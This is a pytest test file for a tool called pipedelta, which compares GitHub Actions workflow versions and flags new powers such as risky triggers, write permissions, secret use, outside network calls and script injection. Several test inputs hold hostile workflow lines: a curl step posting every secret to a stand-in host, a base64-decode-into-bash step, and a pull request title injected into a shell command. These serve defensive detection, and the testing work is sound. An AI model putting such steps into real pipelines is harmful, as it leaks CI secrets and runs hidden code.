from pathlib import Path

from pipedelta.cli import main
from pipedelta.delta import compare, overall
from pipedelta.powers import Power, extract_powers

EX = Path(__file__).parent.parent / "examples"
BEFORE = (EX / "before.yml").read_text()
ATTACK = (EX / "after-attack.yml").read_text()
SAFE = (EX / "after-safe.yml").read_text()


def test_on_key_is_read_even_though_yaml_treats_it_as_true():
    assert Power("trigger", "push") in extract_powers(BEFORE)


def test_no_change_means_no_findings():
    assert compare(BEFORE, BEFORE) == []


def test_attack_change_is_high_and_names_each_power():
    findings = compare(BEFORE, ATTACK)
    assert overall(findings) == "high"
    kinds = {(f.power.kind, f.power.name) for f in findings}
    assert ("trigger", "pull_request_target") in kinds
    assert ("permission", "contents: write") in kinds
    assert ("secret", "DEPLOY_TOKEN") in kinds
    assert ("network", "collector.example.invalid") in kinds
    assert ("action", "some-stranger/format-helper@v1") in kinds


def test_network_plus_secret_in_same_job_is_raised_to_high():
    findings = compare(BEFORE, ATTACK)
    net = next(f for f in findings if f.power.kind == "network")
    assert net.level == "high"
    assert "secrets" in net.message


def test_ordinary_change_is_low():
    findings = compare(BEFORE, SAFE)
    assert overall(findings) == "low"
    assert len(findings) == 1


def test_brand_new_workflow_file_reports_all_its_powers():
    assert overall(compare(None, ATTACK)) == "high"


def test_removed_powers_are_not_reported():
    assert compare(ATTACK, BEFORE) == []


def test_pinned_outside_action_is_medium():
    new = BEFORE.replace(
        "- run: python -m pytest",
        "- uses: someone/tool@" + "a" * 40 + "\n      - run: python -m pytest",
    )
    assert overall(compare(BEFORE, new)) == "medium"


def test_injection_is_detected():
    new = BEFORE.replace(
        "- run: python -m pytest",
        '- run: echo "${{ github.event.pull_request.title }}"',
    )
    findings = compare(BEFORE, new)
    assert any(f.power.kind == "injection" and f.level == "high" for f in findings)


def test_cli_exit_codes(capsys):
    assert main(["diff", str(EX / "before.yml"), str(EX / "after-safe.yml")]) == 0
    assert main(["diff", str(EX / "before.yml"), str(EX / "after-attack.yml")]) == 1
    assert "new power" in capsys.readouterr().out


def test_markdown_report_has_marker_and_table():
    from pipedelta.report import MARKER, render_markdown

    text = render_markdown({"ci.yml": compare(BEFORE, ATTACK)})
    assert text.startswith(MARKER)
    assert "| high |" in text
    assert "5 new power(s)" in text


def test_markdown_report_when_nothing_gained():
    from pipedelta.report import render_markdown

    assert "no new powers" in render_markdown({"ci.yml": []})
    assert "does not touch" in render_markdown({})


def test_action_mode_on_a_real_git_history(tmp_path, monkeypatch, capsys):
    import json
    import subprocess

    def git(*args):
        subprocess.run(["git", *args], cwd=tmp_path, check=True, capture_output=True)

    def sha():
        out = subprocess.run(
            ["git", "rev-parse", "HEAD"], cwd=tmp_path, check=True, capture_output=True, text=True
        )
        return out.stdout.strip()

    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    git("init", "-q")
    git("config", "user.email", "t@example.com")
    git("config", "user.name", "t")
    (wf / "ci.yml").write_text(BEFORE)
    git("add", "-A")
    git("commit", "-qm", "base")
    base = sha()
    (wf / "ci.yml").write_text(ATTACK)
    git("commit", "-qam", "change")
    head = sha()

    event = tmp_path / "event.json"
    event.write_text(
        json.dumps({"pull_request": {"number": 1, "base": {"sha": base}, "head": {"sha": head}}})
    )
    summary = tmp_path / "summary.md"
    output = tmp_path / "output.txt"
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("GITHUB_EVENT_PATH", str(event))
    monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(summary))
    monkeypatch.setenv("GITHUB_OUTPUT", str(output))
    monkeypatch.delenv("PIPEDELTA_TOKEN", raising=False)

    assert main(["action", "--fail-on", "high"]) == 1
    assert "PipeDelta report" in summary.read_text()
    assert "level=high" in output.read_text()
    assert main(["action", "--fail-on", "never"]) == 0


def test_fixed_version_is_medium_and_passes_the_default_gate():
    fixed = (EX / "after-fixed.yml").read_text()
    findings = compare(BEFORE, fixed)
    assert overall(findings) == "medium"
    assert len(findings) == 1
    assert main(["diff", str(EX / "before.yml"), str(EX / "after-fixed.yml")]) == 0


def test_version_bump_of_an_action_already_in_use_is_low():
    old = BEFORE.replace(
        "- run: python -m pytest", "- uses: someone/tool@v1\n      - run: python -m pytest"
    )
    new = old.replace("someone/tool@v1", "someone/tool@v2")
    findings = compare(old, new)
    assert overall(findings) == "low"
    assert "version" in findings[0].message


def test_unlocking_a_pinned_action_is_high():
    old = BEFORE.replace("- run: python -m pytest", "- uses: someone/tool@" + "a" * 40)
    new = BEFORE.replace("- run: python -m pytest", "- uses: someone/tool@v2")
    assert overall(compare(old, new)) == "high"


def test_renaming_a_job_does_not_create_high_findings():
    old = BEFORE.replace(
        "- run: python -m pytest",
        "- uses: someone/tool@v1\n        env:\n          K: ${{ secrets.KEY }}",
    )
    new = old.replace("  test:", "  unit-tests:")
    assert overall(compare(old, new)) == "low"


def test_to_json_secrets_counts_as_every_secret():
    new = (
        BEFORE
        + '      - run: curl -d "$A" https://x.example.invalid\n        env:\n          A: ${{ toJSON(secrets) }}\n'
    )
    findings = compare(BEFORE, new)
    assert overall(findings) == "high"
    assert any("every secret" in f.power.name for f in findings)


def test_decoded_and_executed_text_is_high():
    new = BEFORE + "      - run: echo abc | base64 -d | bash\n"
    findings = compare(BEFORE, new)
    assert any(f.power.kind == "hidden" and f.level == "high" for f in findings)


def test_ordinary_base64_use_is_not_flagged():
    new = BEFORE + '      - run: echo "$CERT" | base64 -d > cert.pem\n'
    assert compare(BEFORE, new) == []
